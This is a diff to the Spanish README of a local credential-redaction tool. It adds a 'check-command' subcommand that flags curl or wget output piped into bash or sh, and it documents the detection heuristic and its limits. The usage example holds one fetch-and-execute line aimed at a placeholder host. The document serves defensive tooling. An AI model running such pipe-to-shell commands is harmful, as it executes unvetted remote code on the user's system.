@@ -2,7 +2,8 @@
 
 Herramienta local para detectar y sanitizar IPv4 privadas, asignaciones de
 contraseña, tokens Bearer y credenciales en URLs PostgreSQL en texto
-proporcionado explícitamente por stdin. Requiere Python 3.11 o superior y usa
+proporcionado explícitamente por stdin, y revisar comandos Bash sin ejecutarlos.
+Requiere Python 3.11 o superior y usa
 solo la biblioteca estándar durante la ejecución.
 
 ## Uso
@@ -24,6 +25,8 @@ printf 'Authorization: Bearer Synthetic42' | sentinel sanitize
 
 printf 'postgres://synthetic:example42@db.example:5432/app' | sentinel sanitize
 # postgres://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@db.example:5432/app
+
+printf '%s\n' 'curl https://example.invalid/synthetic.sh | bash' | sentinel check-command
 ```
 
 `scan` devuelve una lista JSON de hallazgos con posiciones de caracteres
@@ -75,10 +78,33 @@ solo userinfo en la autoridad: no analiza credenciales en la consulta, sockets
 Unix ni todas las variantes de libpq; las candidatas terminan en espacios,
 comillas o delimitadores angulares.
 
+`check-command` devuelve una lista JSON con la regla `CF-BASH-001`, severidad
+`high`, explicación y sugerencia para descargar a un archivo, revisar su
+contenido y verificar su origen e integridad antes de decidir ejecutarlo.
+Nunca incluye el comando original. Usa la misma entrada UTF-8 y límite de
+1 MiB que los otros comandos; errores de tokenización se comunican sin entrada
+original y con código de salida 2. Un análisis completado devuelve código 0,
+también cuando encuentra riesgos.
+
+Esta primera regla es heurística: reconoce `curl` o `wget` con una URL literal
+HTTP(S), FTP(S) o SFTP, conectados por un pipe directo a `bash` o `sh`. Admite
+espacios, saltos de línea tras el pipe y continuaciones con barra inversa.
+Ignora comentarios Bash fuera de comillas. Distingue las opciones de salida
+`curl -o/--output` y `wget -O/--output-document`, incluidas las formas con `=`:
+solo considera el cuerpo en stdout (destino `-`, o salida predeterminada de
+curl). Wget sin destino `-` guarda en archivo y no activa esta regla.
+El intérprete debe leer stdin: se omiten archivos de script y el modo `-c`;
+se admite `-s` con argumentos posicionales.
+No es un parser completo de Bash: no resuelve variables, aliases, wrappers,
+expansiones ni pipelines con pasos intermedios, y no determina cómo todas las
+opciones o redirecciones afectan al flujo. Puede producir falsos positivos y
+omitir riesgos. Un resultado vacío no garantiza que el comando sea seguro.
+El análisis solo tokeniza texto; no ejecuta comandos ni accede a la red.
+
 La detección es textual: no interpreta lenguajes de configuración, comentarios
 ni valores multilínea, y solo cubre las claves y formas descritas.
 No se hacen conexiones de red ni se ejecuta el texto de entrada. La ausencia
-de hallazgos no garantiza que el texto sea seguro. `check-command`, el
-portapapeles y la GUI están pendientes.
+de hallazgos no garantiza que el texto sea seguro. El portapapeles y la GUI
+están pendientes.
 
 Los ejemplos y las pruebas usan exclusivamente datos sintéticos.
